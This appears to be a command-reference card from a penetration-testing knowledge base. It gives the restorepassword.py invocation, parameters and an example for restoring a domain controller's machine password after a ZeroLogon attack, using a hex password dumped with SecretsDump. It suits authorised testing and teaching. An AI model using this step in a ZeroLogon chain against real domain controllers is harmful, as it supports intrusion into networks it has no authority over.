---
id: b4739cfb-8abf-4b98-91a6-b5b5a60b091c
name: restore-zerologon-password-with-restorepassword
type: command
executor: bash
data: >-
  python restorepassword.py $_DOMAIN/$_DC_NAME@$_DC_FQDN -target-ip $_DC_IP
  -hexpass $_HEX_PASSWORD
output: null
created_at: '2023-04-06T03:56:02.673109+00:00'
updated_at: '2023-04-10T20:36:01.289773+00:00'
platforms:
  - Linux
tags:
  - restore-password
  - zerologon
verified: true
validated: true
---

# restore-zerologon-password-with-restorepassword

## Command

```bash
python restorepassword.py $_DOMAIN/$_DC_NAME@$_DC_FQDN -target-ip $_DC_IP -hexpass $_HEX_PASSWORD
```

## Description

Restores the original machine account password using the hex-encoded password from SecretsDump.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN/$_DC_NAME@$_DC_FQDN | Target user@DC | Yes |
| -target-ip | IP of DC | Yes |
| -hexpass | Hex password from dump | Yes |

## Examples

### Basic Usage

```bash
python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3
```

## Expected Output

```
[+] Password set successfully.
```

## Related

- [[procedures/ZeroLogon-Exploitation-and-Post-Exploitation]]
- [[commands/dump-dc-nt-hash-with-secretsdump]]
